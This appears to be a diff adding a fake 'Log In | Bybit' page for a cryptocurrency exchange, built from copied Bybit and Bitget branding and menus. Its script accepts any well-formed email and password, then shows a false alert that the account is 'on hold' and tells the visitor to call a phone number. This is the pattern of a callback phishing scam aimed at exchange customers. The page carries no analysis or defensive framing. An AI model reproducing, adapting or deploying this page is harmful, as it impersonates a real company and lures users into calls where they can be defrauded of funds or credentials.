@@ -1,0 +1,499 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <link href="https://assets.staticimg.com/public-web/2.6.22/static/fontsGoogleapis/googleapis.css" rel="prefetch" as="style">
+    <link rel="preload" href="assets/css/KUCOINSans-Bold.woff2" as="font" type="font/woff2" crossorigin="true">
+    <link href="style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="https://fh-static.bycsi.com/images/home/official-image.png">
+    <title>Log In | Bybit</title>
+</head>
+
+<body>
+
+    <header>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-12 col-4 d-flex justify-content-end">
+                    <div class="logoContainer"><svg xmlns="http://www.w3.org/2000/svg" width="57" height="22" viewBox="0 0 87 34" fill="none">
+                            <path d="M62.0083 25.3572V3H66.5022V25.3572H62.0083Z" fill="#F7A600" />
+                            <path
+                                d="M9.63407 31.9983H0V9.64111H9.24666C13.7406 9.64111 16.3591 12.0903 16.3591 15.9214C16.3591 18.4013 14.6774 20.0039 13.5134 20.5375C14.9028 21.1652 16.6813 22.5779 16.6813 25.5624C16.6813 29.7373 13.7406 31.9983 9.63407 31.9983ZM8.89096 13.5355H4.4939V18.6852H8.89096C10.7981 18.6852 11.8652 17.6488 11.8652 16.1095C11.8652 14.5719 10.7981 13.5355 8.89096 13.5355ZM9.18151 22.6104H4.4939V28.1056H9.18151C11.2189 28.1056 12.1874 26.8503 12.1874 25.3418C12.1874 23.835 11.2171 22.6104 9.18151 22.6104Z"
+                                fill="white" />
+                            <path
+                                d="M30.3882 22.8293V31.9983H25.926V22.8293L19.0073 9.64111H23.8886L28.1888 18.6527L32.4239 9.64111H37.3052L30.3882 22.8293Z"
+                                fill="white" />
+                            <path
+                                d="M50.0457 31.9983H40.4116V9.64111H49.6583C54.1522 9.64111 56.7707 12.0903 56.7707 15.9214C56.7707 18.4013 55.089 20.0039 53.925 20.5375C55.3144 21.1652 57.093 22.5779 57.093 25.5624C57.093 29.7373 54.1522 31.9983 50.0457 31.9983ZM49.3026 13.5355H44.9055V18.6852H49.3026C51.2097 18.6852 52.2768 17.6488 52.2768 16.1095C52.2768 14.5719 51.2097 13.5355 49.3026 13.5355ZM49.5931 22.6104H44.9055V28.1056H49.5931C51.6305 28.1056 52.599 26.8503 52.599 25.3418C52.599 23.835 51.6305 22.6104 49.5931 22.6104Z"
+                                fill="white" />
+                            <path d="M80.986 13.5355V32H76.4921V13.5355H70.4785V9.64111H86.9996V13.5355H80.986Z"
+                                fill="white" />
+                        </svg>
+
+                        <!-- <img src="assets/img/logo.png" class="logoMain"> -->
+                    </div>
+                    <nav class="navbar navbar-expand-lg navbar-light bg-light w-100">
+                        <!-- Container wrapper -->
+                        <div class="container-fluid px-0">
+                            <!-- Toggle button -->
+                            <button class="navbar-toggler px-0" type="button" data-mdb-toggle="collapse" data-mdb-target="#navbarExampleOnHover" aria-controls="navbarExampleOnHover" aria-expanded="false" aria-label="Toggle navigation">
+                                <i class="fas fa-bars"></i>
+                            </button>
+
+                            <!-- Collapsible wrapper -->
+                            <div class="collapse navbar-collapse" id="navbarExampleOnHover">
+                                <!-- Left links -->
+                                <ul class="navbar-nav me-auto ps-lg-0" style="padding-left: 0.15rem">
+                                    <!-- Navbar dropdown -->
+                                    <li class="nav-item dropdown dropdown-hover position-static">
+                                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-mdb-toggle="dropdown" aria-expanded="false">
+                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAInSURBVHgB7drNTQMxEAXgtwgBkThQwtIBVEAoA7iQCqADoIRUEC7UQaiAUAEpgQPiR0IaZsMGcXFmslpjW3qfZAVky5t9meXHGoCIiKhUFQojE+x9bOFC3/lQvx2ig0ow+wLGu2e4NdeiIO8T1NjGvX5Zox9zfOJ4MNLXgA2UpN9wsNhL92yqMrRgrYBEZE/HlY576e5RxznW9HqHc/QbzlL9toXL0KQ7IL2pWl8edVyj47PfOtAx0f2e2z1dNiv9uRPJRoWj4Bz8+i9v3bOpSs9i+Qk2lmFowhVQ+0jU6F+t4xIZ81ZQtPJWR8iYN6Ak5Z2Dsn7NJ8CADAzIwIAMDMjAgAwMyMCADAzIwIAMJQU0RSR6UjALzZUTkOABkegZ9Tg4B4fmGBARVcpaszis314c2NXo13xwiv3QpLeCpohn5llUjfCiH+cxED5g72De7hnkDShaeauxd+HgpP20BSOt6Sd0JM39CG52PnHY7LlqrfcRa45Fo5S3Pl37yJirgvQmXvSl//LG6vIuUnM+rWMm3U11XHsP64mIiOhfSKLuDknYVbLOm6zlpyOjL8/i6O5Idd0ld4dZszEi/Kuh47D9Sz2r6y5l3d0hGXSV5N7dkbyrJOsDs1TX/YuH9gYGZGBABgZkYEAGBmRgQAYGZGBABgZkYEAGBmRgQIbcuzumSHPdX7l3dyTvKsm6u0My6CrJurujyK4SSdTdIewqISIiIqKcfAPjxe2fX/FuhAAAAABJRU5ErkJggg=="
+                                                width="24px" />
+                                        </a>
+                                        <!-- Dropdown menu -->
+                                        <div class="dropdown-menu w-100 mt-0" aria-labelledby="navbarDropdown" style="border-top-left-radius: 0;
+                                                  border-top-right-radius: 0;
+                                                ">
+
+                                            <div class="container px-0">
+                                                <div class="row my-4">
+                                                    <div class="col-md-6 col-lg-4 mb-3 mb-lg-0">
+                                                        <h6 class="menuTopHeading">Promotions</h6>
+                                                        <div class="list-group list-group-flush">
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/proof_reserves-black.c9dc367.svg" />
+                                                                </div>
+                                                                VIP Program <span>Get exclusive access to fee discounts & more</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/give-black.c8839d6.svg" />
+                                                                </div>
+                                                                Referral Programhot <span>Refer a friend and earn up to 30% commissions for every trade they make on Bybit</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/mystery-black.803774a.svg" />
+                                                                </div>
+                                                                Affiliate Program <span>Convert your influence into affluence</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/friend-black.989d2a2.svg" />
+                                                                </div>
+                                                                Rewards Hub <span>Complete simple tasks to claim rewards dealss</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/votecoin-black.b9f506c.svg" />
+                                                                </div>
+                                                                Broker ProgramNEW <span>100% rebate on Spot</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/group-coin-black.fa322d3.svg" />
+                                                                </div>
+                                                                $BIT Incentives <span>Maximize your $BIT holdings and learn more about $BIT utility in the BitDAO ecosystem</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </li>
+                                    <li class="nav-item dropdown dropdown-hover position-static">
+                                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-mdb-toggle="dropdown" aria-expanded="false">
+                                            Buy Crypto
+                                        </a>
+                                        <!-- Dropdown menu -->
+                                        <div class="dropdown-menu w-100 mt-0" aria-labelledby="navbarDropdown" style="border-top-left-radius: 0;
+                                                  border-top-right-radius: 0;
+                                                ">
+
+                                            <div class="container px-0">
+                                                <div class="row my-4">
+                                                    <div class="col-md-6 col-lg-4 mb-3 mb-lg-0">
+                                                        <div class="list-group list-group-flush">
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/proof_reserves-black.c9dc367.svg" />
+                                                                </div>
+                                                                One-Click Buy <span>Buy Crypto Within Seconds</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                P2P Trading (0 Fees)hot <span>50+ Fiat Currencies and Various popular local payment methods with Best Prices</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                Fiat Deposit <span>Top up Balance via Bank Transfer or a Bank Card</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                Crypto Deposit <span>Instant Crypto Deposits to Your Spot Account</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </li>
+                                    <li class="nav-item dropdown dropdown-hover position-static">
+                                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-mdb-toggle="dropdown" aria-expanded="false">
+                                            Markets
+                                        </a>
+                                        <!-- Dropdown menu -->
+                                        <div class="dropdown-menu w-100 mt-0" aria-labelledby="navbarDropdown" style="border-top-left-radius: 0;
+                                                  border-top-right-radius: 0;
+                                                ">
+
+                                            <div class="container px-0">
+                                                <div class="row my-4">
+                                                    <div class="col-md-6 col-lg-4 mb-3 mb-lg-0">
+                                                        <h6 class="menuTopHeading">Campaigns</h6>
+                                                        <div class="list-group list-group-flush">
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/proof_reserves-black.c9dc367.svg" />
+                                                                </div>
+                                                                Markets <span>Crypto Market Information</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                Rankings <span>Crypto Rankings</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                Market Data <span>Bitget and Big Data</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/buycoin-ptp-black.d96d8fd.svg" />
+                                                                </div>
+                                                                Insights <span>Market trends from experts</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </li>
+                                    <li class="nav-item dropdown dropdown-hover position-static">
+                                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-mdb-toggle="dropdown" aria-expanded="false">
+                                            Copy Trading
+                                        </a>
+                                        <!-- Dropdown menu -->
+                                        <div class="dropdown-menu w-100 mt-0" aria-labelledby="navbarDropdown" style="border-top-left-radius: 0;
+                                                  border-top-right-radius: 0;
+                                                ">
+
+                                            <div class="container px-0">
+                                                <div class="row my-4">
+                                                    <div class="col-md-6 col-lg-4 mb-3 mb-lg-0">
+                                                        <div class="list-group list-group-flush">
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/copy-trading-overview-black.b248393.svg" />
+                                                                </div>
+                                                                Overview <span>What is copy trading</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/copy-trading-black.943299d.svg" />
+                                                                </div>
+                                                                Futures Copy Trading <span>Copy trades from top
+                                                                    traders</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/copy-trading-spot-black.fecc9f5.svg" />
+                                                                </div>
+                                                                Spot Copy Trading <span>Follow spot trading
+                                                                    experts</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/strategy_trading-bot-black.9236358.svg" />
+                                                                </div>
+                                                                Strategy Copy Trading <span>All strategies and
+                                                                    strategists</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/strategy_trading-plaza-black.0fc958f.svg" />
+                                                                </div>
+                                                                Create a strategy <span>Create strategies with a variety
+                                                                    of tools</span>
+                                                            </a>
+                                                            <a href="" class="list-group-item list-group-item-action">
+                                                                <div class="img-Menu d-none">
+                                                                    <img src="https://www.bitget.com/_nuxt/img/star-trader2-black.072c462.svg" />
+                                                                </div>
+                                                                Star Trader Program <span>Monthly selection of TOP3
+                                                                    legendary Star Traders</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </li>
+                                    <li class="nav-item dropdown dropdown-hover position-static">
+                                        <a class="nav-link" href="#" id="navbarDropdown" role="button" data-mdb-toggle="dropdown" aria-expanded="false">
+                                            Web3
+                                        </a>
+                                    </li>
+                                </ul>
+                                <!-- Left links -->
+                                <span class="linkMenu">Log In</span>
+                                <button class="btnMenu">Sign Up</button>
+                                <div class="svgMenuIcon">
+                                    <svg width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M8.29 13.29a1 1 0 0 0 0 1.42l3 3a1.002 1.002 0 0 0 1.42 0l3-3a1.004 1.004 0 1 0-1.42-1.42L13 14.59V3a1 1 0 0 0-2 0v11.59l-1.29-1.3a1 1 0 0 0-1.42 0ZM18 9h-2a1 1 0 1 0 0 2h2a1 1 0 0 1 1 1v7a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-7a1 1 0 0 1 1-1h2a1 1 0 0 0 0-2H6a3 3 0 0 0-3 3v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3 3 0 0 0-3-3Z"
+                                            fill="#fff"></path>
+                                    </svg>
+                                </div>
+                                <div class="svgMenuIcon">
+                                    <svg width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M9.52 4.392A8.009 8.009 0 0 0 4.061 11h2.997c.227-2.363 1.078-4.627 2.46-6.608Zm4.96 0c1.383 1.981 2.234 4.245 2.461 6.608h2.997a8.009 8.009 0 0 0-5.457-6.608ZM14.93 11c-.269-2.373-1.28-4.642-2.93-6.54C10.35 6.357 9.339 8.626 9.07 11h5.86Zm-5.86 2h5.86c-.269 2.373-1.28 4.642-2.93 6.54-1.65-1.898-2.661-4.167-2.93-6.54Zm-2.011 0H4.062a8.009 8.009 0 0 0 5.457 6.608C8.137 17.627 7.286 15.363 7.06 13Zm7.422 6.608c1.382-1.981 2.233-4.245 2.46-6.608h2.997a8.008 8.008 0 0 1-5.457 6.608ZM2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Z"
+                                            fill="#fff"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <!-- Collapsible wrapper -->
+                        </div>
+                        <!-- Container wrapper -->
+                    </nav>
+
+                    <!-- <ul>
+                        <li><svg width="25" height="24" viewBox="0 0 25 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg" class="moreIcon">
+                                <rect width="24" height="24" transform="translate(0.735352)" fill="none"></rect>
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M4.73535 5C4.73535 4.44772 5.18307 4 5.73535 4H7.73535C8.28764 4 8.73535 4.44772 8.73535 5V7C8.73535 7.55228 8.28764 8 7.73535 8H5.73535C5.18307 8 4.73535 7.55228 4.73535 7V5ZM4.73535 11C4.73535 10.4477 5.18307 10 5.73535 10H7.73535C8.28764 10 8.73535 10.4477 8.73535 11V13C8.73535 13.5523 8.28764 14 7.73535 14H5.73535C5.18307 14 4.73535 13.5523 4.73535 13V11ZM5.73535 16C5.18307 16 4.73535 16.4477 4.73535 17V19C4.73535 19.5523 5.18307 20 5.73535 20H7.73535C8.28764 20 8.73535 19.5523 8.73535 19V17C8.73535 16.4477 8.28764 16 7.73535 16H5.73535ZM10.7354 5C10.7354 4.44772 11.1831 4 11.7354 4H13.7354C14.2876 4 14.7354 4.44772 14.7354 5V7C14.7354 7.55228 14.2876 8 13.7354 8H11.7354C11.1831 8 10.7354 7.55228 10.7354 7V5ZM11.7354 10C11.1831 10 10.7354 10.4477 10.7354 11V13C10.7354 13.5523 11.1831 14 11.7354 14H13.7354C14.2876 14 14.7354 13.5523 14.7354 13V11C14.7354 10.4477 14.2876 10 13.7354 10H11.7354ZM10.7354 17C10.7354 16.4477 11.1831 16 11.7354 16H13.7354C14.2876 16 14.7354 16.4477 14.7354 17V19C14.7354 19.5523 14.2876 20 13.7354 20H11.7354C11.1831 20 10.7354 19.5523 10.7354 19V17ZM17.7354 4C17.1831 4 16.7354 4.44772 16.7354 5V7C16.7354 7.55228 17.1831 8 17.7354 8H19.7354C20.2876 8 20.7354 7.55228 20.7354 7V5C20.7354 4.44772 20.2876 4 19.7354 4H17.7354ZM16.7354 11C16.7354 10.4477 17.1831 10 17.7354 10H19.7354C20.2876 10 20.7354 10.4477 20.7354 11V13C20.7354 13.5523 20.2876 14 19.7354 14H17.7354C17.1831 14 16.7354 13.5523 16.7354 13V11ZM17.7354 16C17.1831 16 16.7354 16.4477 16.7354 17V19C16.7354 19.5523 17.1831 20 17.7354 20H19.7354C20.2876 20 20.7354 19.5523 20.7354 19V17C20.7354 16.4477 20.2876 16 19.7354 16H17.7354Z"
+                                    fill="url(#paint0_linear_656_13387)"></path>
+                                <defs>
+                                    <linearGradient id="paint0_linear_656_13387" x1="4.73535" y1="4" x2="20.7354"
+                                        y2="20" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="var(--color-more-icon)"></stop>
+                                        <stop offset="1" stop-color="var(--color-more-icon)" stop-opacity="0.1">
+                                        </stop>
+                                    </linearGradient>
+                                </defs>
+                            </svg></li>
+                    </ul> -->
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <section class="sectionformWrapper">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-10 offset-md-1 d-flex justify-content-center align-items-center">
+                    <div class="formContainerMain">
+                        <div class="formContainerMainSide">
+                            <h2 class="headingLogin">Welcome to Bybit</h2>
+                            <div class="formWrapper">
+                                <div class="formLoginDetails mt-4">
+                                    <form action="#" method="post" autocomplete="off">
+                                        <div class="newBit">
+                                            <span>New to Bybit? </span>
+                                            <span class="sign">Sign up</span>
+                                        </div>
+                                        <div class="formWrapperLabelinput">
+                                            <div class="formWrapperInput">
+                                                <div class="formWrapperInputDetails">
+                                                    <div class="formWrapperInputDetailsMainInput">
+                                                        <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" placeholder="Email / Mobile number" autocapitalize="off" value="">
+                                                    </div>
+                                                </div>
+                                                <div class="formWrapperInputDetailsPass mt-2" id="formWrapperInputDetailsPass">
+                                                    <div class="formWrapperInputDetailsMainInput">
+                                                        <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" placeholder="Enter Your Pasword" autocapitalize="off" value="">
+                                                        <div style="margin-right: 10px;">
+                                                            <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="18" height="18" fill="#a7b1bb" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                                                                <path
+                                                                    d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
+                                                                <path
+                                                                    d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
+                                                            </svg>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="errorMsg" id="errorMsg"></p>
+                                            </div>
+                                        </div>
+                                        <div class="footerLoginLinks">
+                                            <span>
+                                                Forgot Password?
+                                            </span>
+                                        </div>
+                                        <div class="footerLoginButton">
+                                            <button class="click_login_submit" id="click_login_submit" type="button">Log
+                                                In</button>
+                                        </div>
+                                        <div class="LoginFormOther">
+                                            <div class="LoginFormOtherText">
+                                                Or log in with
+                                            </div>
+                                        </div>
+
+                                        <div class="socialWrapper">
+                                            <div class="socialText">
+                                                <div class="iconWrapper" style="margin-right: 16px;">
+                                                    <img src="https://www.bybit.com/common-static/cht-static/user-svc/img/google_icon.png" style="width:18px;" />
+                                                    <span>Google</span>
+                                                </div>
+                                            </div>
+                                            <div class="socialText">
+                                                <div class="iconWrapper">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="21" viewBox="0 0 20 21" fill="none">
+                                                        <g clip-path="url(#clip0_2232_35694)">
+                                                            <path
+                                                                d="M18.1437 16.5841C17.8385 17.2829 17.4772 17.9261 17.0586 18.5174C16.4881 19.3235 16.0209 19.8815 15.6609 20.1914C15.1027 20.7 14.5048 20.9605 13.8644 20.9753C13.4047 20.9753 12.8504 20.8457 12.205 20.5828C11.5576 20.321 10.9626 20.1914 10.4186 20.1914C9.84801 20.1914 9.23608 20.321 8.58155 20.5828C7.92602 20.8457 7.39793 20.9828 6.99417 20.9963C6.38012 21.0223 5.76806 20.7544 5.15713 20.1914C4.7672 19.8544 4.27947 19.2766 3.6952 18.4581C3.06832 17.5841 2.55294 16.5705 2.14918 15.415C1.71677 14.1669 1.5 12.9583 1.5 11.7882C1.5 10.4479 1.79226 9.29187 2.37766 8.32314C2.83773 7.54501 3.44978 6.9312 4.21581 6.4806C4.98185 6.03 5.80955 5.80037 6.70091 5.78568C7.18863 5.78568 7.82822 5.93518 8.62303 6.229C9.4156 6.52381 9.92451 6.67331 10.1476 6.67331C10.3144 6.67331 10.8798 6.4985 11.8382 6.14999C12.7445 5.82679 13.5094 5.69297 14.136 5.74568C15.834 5.88148 17.1097 6.54479 17.9581 7.73982C16.4395 8.65164 15.6883 9.92877 15.7032 11.5671C15.7169 12.8432 16.1841 13.9052 17.1022 14.7484C17.5183 15.1397 17.983 15.4422 18.5 15.657C18.3879 15.9792 18.2695 16.2878 18.1437 16.5841ZM14.2494 1.39816C14.2494 2.39839 13.8806 3.3323 13.1456 4.19672C12.2586 5.22434 11.1857 5.81815 10.0223 5.72445C10.0075 5.60445 9.99888 5.47816 9.99888 5.34545C9.99888 4.38523 10.4207 3.35761 11.1698 2.51739C11.5438 2.09197 12.0194 1.73824 12.5962 1.45606C13.1718 1.17809 13.7162 1.02437 14.2282 0.998047C14.2431 1.13176 14.2494 1.26549 14.2494 1.39815V1.39816Z"
+                                                                fill="#0D0E0E" />
+                                                        </g>
+                                                        <defs>
+                                                            <clipPath id="clip0_2232_35694">
+                                                                <rect y="0.998047" width="20" height="20" rx="6"
+                                                                    fill="white" />
+                                                            </clipPath>
+                                                        </defs>
+                                                    </svg>
+                                                    <span>Apple</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                    <div class="dontHaveAccount">Log in with Subaccount <img src="https://www.bybit.com/common-static/cht-static/user-svc/img/right_arrow_icon.png" width="10px" height="10px" /></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="formContainerSideQR">
+                            <div class="telegramWrapperImg">
+                                <img src="download.png" class="sideBgLeft" />
+                            </div>
+                            <div class="telegramWrapper">
+                                <img src="telegram.png" class="telegram" />
+                                <div class="telegramTextLink">
+                                    <span class="Spanheading">Join Bitget Telegram Now</span>
+                                    <span>
+                                        Get help, share ideas, and receive firsthand Bitget news.
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer id="footer">
+        <div class="footerText">
+            We use cookies to improve and personalize your experience. To find out more, please read and agree with our <span class="cookiesBtn">Cookies Policy.</span>
+        </div>
+        <div class="cookiesButn">
+            Allow Cookies
+        </div>
+    </footer>
+
+    <div id="popupBox">
+        <div id="popupBoxClose">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                <path
+                    d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8 2.146 2.854Z" />
+            </svg>
+        </div>
+        <div id="popupBoxMsg">
+        </div>
+    </div>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+    <script>
+        var crossButton = document.getElementById('crossButtonMenu');
+        var menuScreen = document.getElementById('sidebarMenu');
+        var menuIcon = document.getElementById('menuIcon');
+        var click_login_submit = document.getElementById('click_login_submit');
+        var username = document.getElementById('username');
+        var errorMsg = document.getElementById('errorMsg');
+
+        var popupBoxClose = document.getElementById('popupBoxClose');
+        var popupBox = document.getElementById('popupBox');
+        var popupBoxMsg = document.getElementById('popupBoxMsg');
+        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
+        var passwordField = document.getElementById('passwordField');
+        var btnLoginQR = document.getElementById('btnLoginQR');
+        var eyeIconToggle = document.getElementById('eyeIconToggle');
+        var checkValue = document.getElementById('checkValue');
+
+        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+
+        eyeIconToggle.addEventListener('click', function() {
+            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {
+
+                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
+  <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>`;
+                eyeIconToggle.classList.add('bi-eye-fill');
+                eyeIconToggle.classList.remove('bi-eye-slash-fill');
+                passwordField.setAttribute('type', 'text');
+            } else {
+                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+  <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>`;
+                eyeIconToggle.classList.add('bi-eye-slash-fill');
+                eyeIconToggle.classList.remove('bi-eye-fill');
+                passwordField.setAttribute('type', 'password');
+            }
+        });
+
+        click_login_submit.addEventListener('click', function() {
+            if (username.value == '' && passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email id and password';
+            } else if (username.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email';
+            } else if (!username.value.match(validRegex)) {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill valid email';
+            } else if (passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill Password';
+            } else {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call  (855) 788-5667.';
+            }
+        });
+
+        popupBoxClose.addEventListener('click', function() {
+            popupBox.style.display = 'none';
+            popupBoxMsg.innerText = '';
+        })
+    </script>
+
+</body>
+
+</html>
